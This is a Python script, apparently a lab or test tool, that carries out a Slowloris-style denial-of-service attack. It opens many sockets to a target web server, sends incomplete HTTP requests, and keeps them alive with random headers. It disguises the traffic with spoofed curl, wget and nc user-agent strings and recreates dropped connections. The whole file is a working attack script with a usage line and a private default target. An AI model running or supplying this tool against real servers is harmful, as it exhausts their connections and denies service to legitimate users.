###############################
# Author: Guadagnini Giovanni #
###############################

#usr/bin/env python

import sys
import random
import socket
import time
#from progress.bar import Bar

#regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
#                    "Accept-language: en-US,en,q=0.5"]

wget_headers = ["User-Agent: Wget/1.19.4 (linux-gnu)", "Accept: */*", "Accept-Encoding: identity", "Host: 10.1.5.2" , "Connection: Keep-Alive"]
nc_headers = ["User-Agent: nc/0.0.1", "Host: 10.1.5.2" , "Accept: */*"]
#curl headers
regular_headers = ["Host: 10.1.5.2" , "User-Agent: curl/7.58.0", "Accept: */*"]

def init_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,int(port)))
    req = "GET /" + str(random.randint(1,10)) + ".html HTTP/1.1\r\n"
    req = req.format(random.randint(0,2000)).encode('UTF-8')
    for header in regular_headers:
        req = req + '{}\r\n'.format(header).encode('UTF-8')

    s.send(req)

    return s

def main():
    if len(sys.argv)<5:
        print(("Usage: {} 10.1.5.2 80 100 10".format(sys.argv[0])))
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count= int(sys.argv[3])
    #bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
    timer = int(sys.argv[4])
    socket_list=[]

    for _ in range(int(socket_count)):
        try:
            s=init_socket(ip,port)
        except socket.error:
            break
        socket_list.append(s)
        #next(bar)

    #bar.finish()

    while True:
        print("Sending Keep-Alive Headers ")

        for s in socket_list:
            try:
                req = str(random.choice('ABCDEFGHIJKLMNOPQRSTUWXYZ')) + "-" + str(random.choice('abcdefghijklmnopqrstuvwxyz')) + " {}\r\n"
                s.send(req.format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            print(("Re-creating Socket...".format("\n")))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break

        time.sleep(timer)

if __name__=="__main__":
    main()